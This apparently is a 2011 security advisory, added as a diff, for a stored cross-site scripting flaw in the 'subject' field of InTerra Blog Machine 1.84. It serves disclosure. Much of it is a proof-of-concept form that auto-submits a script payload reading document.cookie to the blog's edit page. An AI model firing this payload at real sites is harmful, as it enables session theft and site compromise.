@@ -1,0 +1,39 @@
+Vulnerability ID: HTB22931
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_interra_blog_machin
+e.html
+Product: InTerra Blog Machine
+Vendor: InTerra Blog Machine Team ( http://code.google.com/p/interra/ )
+Vulnerable Version: 1.84 and probably prior versions
+Vendor Notification: 31 March 2011
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "actions/add.php" script to properly sanitize user-supplied input in "subject" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/POST_URL/edit/" method="post" name="main" enctype="multipart/form-data">
+<!-- POST_URL like "2011/03/31/post_url" -->
+<input type="hidden" name="subject" value='post title"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="content" value='content'>
+<input type="hidden" name="date[Date_Day]" value="31">
+<input type="hidden" name="date[Date_Month]" value="03">
+<input type="hidden" name="date[Date_Year]" value="2011">
+<input type="hidden" name="time[Time_Hour]" value="13">
+<input type="hidden" name="time[Time_Minute]" value="59">
+<input type="hidden" name="comments" value="1">
+<input type="hidden" name="section" value="0">
+<input type="hidden" name="sectionNewName" value="">
+<input type="hidden" name="sectionNewUnix" value="">
+<input type="hidden" name="sectionNewHidden" value="0">
+<input type="hidden" name="replicate" value="1">
+<input type="hidden" name="keywords" value="">
+<input type="hidden" name="edit" value="POST_ID">
+</form>
+<script>
+document.main.submit();
+</script>
